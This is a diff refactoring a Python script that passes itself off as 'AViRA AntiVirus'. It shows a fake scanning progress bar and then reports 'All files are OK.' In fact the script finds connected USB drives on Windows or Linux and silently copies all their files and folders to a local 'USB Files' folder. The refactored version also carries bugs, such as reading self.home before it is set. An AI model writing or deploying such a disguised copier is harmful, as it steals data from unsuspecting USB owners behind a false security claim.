@@ -1,220 +1,146 @@
+from abc import abstractmethod, ABC
 from platform import system as syst
 from time import sleep
-from os import chdir , listdir , path , mkdir
-from shutil import copytree , copyfile
-from progressbar import ProgressBar,Percentage,Bar,ETA,FileTransferSpeed
+from os import chdir, listdir, path, mkdir, sep
+from shutil import copytree, copyfile
+from progressbar import ProgressBar, Percentage, Bar, ETA, FileTransferSpeed
 
 
-
-class MainsWindows:
-    def __init__(self):
-## region destination:
-        self.dest = "C:\\USB Files\\"
-
-        if "USB Files" not in listdir("C:\\"):
-            chdir("C:\\")
-            mkdir("USB Files")
-## endregion
-
-
-        print("\n****AViRA AntiVirus***"
-      "\nInfo(tags/v3.7.6:43364a7ae0, Dec 29 2019, 00:42:30) [MSC v.1916 64 bit (AMD64)] on win32"
-      "\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n\n"
-      "Please wait while checking your files...\n")
-
-        self.usb_number()
-
-    def usb_number(self):
-        chdir(self.dest)
-        lister = listdir('.')
-        Directories = []
-        for i in lister:
-            if path.isdir(i) == True:
-                Directories.append(i)
-
-        if len(Directories) == 0 :
-            self.usbnum = 1
-        else:
-            self.usbnum = int(max(Directories)) + 1
-
-    def usbdrive(self):
-        self.drive_list = []
-        drivebits = GetLogicalDrives()
-        for d in range(1,26):
-            mask = 1 <<  d
-            if drivebits & mask:
-                drname=  '%c:\\' % chr(ord('A') + d)
-                # print(drname)
-                t = GetDriveType(drname)
-                if t == DRIVE_REMOVABLE:
-                    self.drive_list.append(drname)
-
-        # print(self.drive_list)
-
-        if self.drive_list.__len__() == 0 :
-            print("No USB Connected!!!")
-            sleep(4)
-            exit()
-
-    def copier(self):
-        if len(self.drive_list) > 1 :
-            x =0
-            while x < len(self.drive_list):
-                chdir(self.drive_list[x])
-                self.copy()
-                x += 1
-                self.usbnum += 1
-        else:
-            chdir(self.drive_list[0])
-            self.copy()
-
-    def copy(self):
-
-        pwd = listdir('.')
-
-        Files = []
-        Directories = []
-
-        for i in pwd:
-            if path.isfile(i) == True:
-                Files.append(i)
-            if path.isdir(i) == True:
-                Directories.append(i)
-
-        widgets = ['Checking: ' , Percentage() , ' ' , Bar(marker='0' , left='[' , right=']') , ' ' , ETA() , ' ' , FileTransferSpeed()]
-        bar = ProgressBar(widgets = widgets,maxval=len(pwd))
-
-        x = 1
-        bar.start()
-        for dir in Directories:
-            try:
-                # print(self.usbnum)
-                copytree(dir, self.dest + str(self.usbnum) + "\\" + dir)
-                bar.update(x)
-                x += 1
-            except :
-                bar.update(x)
-                x += 1
-        for file in Files:
-            try:
-                copyfile(file, self.dest  + str(self.usbnum) +  "\\"  + file)
-                bar.update(x)
-                x += 1
-            except :
-                bar.update(x)
-                x += 1
-        bar.finish()
-
-    def final(self):
-        print("\n=====No Thread Found=====\n\nAll files are OK.")
-        input()
-
-class MainLinux:
-    def __init__(self):
-## region destination:
-        self.username = getuser()
-
-        self.home = "/home/" + self.username + "/"
-        self.dest =  self.home + "USB Files/"
+class Main:
+    def __init__(self, home, dest):
+        self.usbNum = 0
+        self.usb_drive_list = []
+        self.home = home
+        self.dest = dest
 
         if "USB Files" not in listdir(self.home):
             chdir(self.home)
             mkdir("USB Files")
-## endregion
 
         print("\n****AViRA AntiVirus***"
-      "\nInfo(tags/v3.7.6:43364a7ae0, Dec 29 2019, 00:42:30) [MSC v.1916 64 bit (AMD64)] on win32"
-      "\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n\n"
-      "Please wait while checking your files...\n")
+              "\nInfo(tags/v3.7.6:43364a7ae0, Dec 29 2019, 00:42:30) [MSC v.1916 64 bit (AMD64)] on win32"
+              "Please wait while checking your files...\n")
 
-        self.usb_number()
-
-    def usb_number(self):
+    def USB_Number(self):
         chdir(self.dest)
         lister = listdir('.')
-        Directories = []
-        for i in lister:
-            if path.isdir(i) == True:
-                Directories.append(i)
+        Directories = [i for i in lister if path.isdir(i)]
 
         if len(Directories) == 0:
-                self.usbnum = 1
+            self.usbNum = 1
         else:
-                self.usbnum = int(max(Directories)) + 1
+            self.usbNum = int(max(Directories)) + 1
 
-    def usbdrive(self):
-        chdir("/media/"+self.username+"/")
-        self.drive_list = listdir('.')
+    @abstractmethod
+    def USB_Drive_List(self):
+        pass
 
-        if self.drive_list.__len__() == 0 :
+    @staticmethod
+    def USB_Found_Or_Not(drive_list):
+        if drive_list.__len__() == 0:
             print("No USB Connected!!!")
             sleep(4)
             exit()
 
-    def copier(self):
-        if len(self.drive_list) > 1 :
-            x =0
-            while x < len(self.drive_list):
-                chdir(self.drive_list[x])
-                self.copy()
+    def Copy(self):
+        if len(self.usb_drive_list) > 1:
+            x = 0
+            while x < len(self.usb_drive_list):
+                chdir(self.usb_drive_list[x])
+                self.Copy_Try()
                 x += 1
-                self.usbnum += 1
+                self.usbNum += 1
         else:
-            chdir(self.drive_list[0])
-            self.copy()
+            chdir(self.usb_drive_list[0])
+            self.Copy_Try()
 
-    def copy(self):
-
+    def Copy_Try(self):
         pwd = listdir('.')
+        Files = [i for i in pwd if path.isfile(i)]
+        Directories = [i for i in pwd if path.isdir(i)]
 
-        Files = []
-        Directories = []
-
-        for i in pwd:
-            if path.isfile(i) == True:
-                Files.append(i)
-            if path.isdir(i) == True:
-                Directories.append(i)
-
-        widgets = ['Checking: ' , Percentage() , ' ' , Bar(marker='0' , left='[' , right=']') , ' ' , ETA() , ' ' , FileTransferSpeed()]
-        bar = ProgressBar(widgets = widgets,maxval=len(pwd))
+        widgets = ['Checking: ', Percentage(), ' ', Bar(marker='0', left='[', right=']'), ' ', ETA(), ' ',
+                   FileTransferSpeed()]
+        bar = ProgressBar(widgets=widgets, maxval=len(pwd))
 
         x = 1
         bar.start()
-        for dir in Directories:
+        for dirname in Directories:
             try:
-                copytree(dir, self.dest + str(self.usbnum) + "/" + dir)
+                copytree(dirname, self.dest + str(self.usbNum) + sep + dirname)
                 bar.update(x)
                 x += 1
-            except :
+            except:
                 bar.update(x)
                 x += 1
+
         for file in Files:
             try:
-                copyfile(file, self.dest + str(self.usbnum) + "/" + file)
+                copyfile(file, self.dest + str(self.usbNum) + sep + file)
                 bar.update(x)
                 x += 1
-            except :
+            except:
                 bar.update(x)
                 x += 1
         bar.finish()
 
-    def final(self):
+    @staticmethod
+    def Final():
         print("\n=====No Thread Found=====\n\nAll files are OK.")
         input()
 
-if __name__ == "__main__":
-    #import ctypes
-    #ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 6)
-    if syst() == "Windows":
+
+class MainWindows(Main, ABC):
+    def __init__(self):
+        super().__init__("C:\\", "C:\\USB Files\\")
+        self.USB_Number()
+        self.usb_drive_list = self.USB_Drive_List()
+        self.USB_Found_Or_Not(self.usb_drive_list)
+        self.Copy()
+        self.Copy_Try()
+        self.Final()
+
+    def USB_Drive_List(self):
         from win32file import GetDriveType, GetLogicalDrives, DRIVE_REMOVABLE
-        M = MainsWindows()
-        M.usbdrive()
-        M.copier()
-        M.final()
-    if syst() == "Linux":
+        
+        drive_list = []
+        drivebits = GetLogicalDrives()
+        for d in range(1, 26):
+            mask = 1 << d
+            if drivebits & mask:
+                dirname = '%c:\\' % chr(ord('A') + d)
+                t = GetDriveType(dirname)
+                if t == DRIVE_REMOVABLE:
+                    drive_list.append(dirname)
+        return drive_list
+
+
+class MainLinux(Main, ABC):
+    def __init__(self):
         from getpass import getuser
+
+        self.username = getuser()
+        home = "/home/" + self.username + sep
+        dest = self.home + "USB Files/"
+
+        super().__init__(home, dest)
+        self.USB_Number()
+        self.usb_drive_list = self.USB_Drive_List()
+        self.USB_Found_Or_Not(self.usb_drive_list)
+        self.Copy()
+        self.Copy_Try()
+        self.Final()
+
+    def USB_Drive_List(self):
+        chdir("/media/" + self.username + sep)
+        drive_list = listdir('.')
+        return drive_list
+
+
+if __name__ == "__main__":
+    # import ctypes
+    # ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 6)
+    if syst() == "Windows":
+        M = MainWindows()
+    if syst() == "Linux":
         M = MainLinux()
-        M.usbdrive()
-        M.copier()
-        M.final()
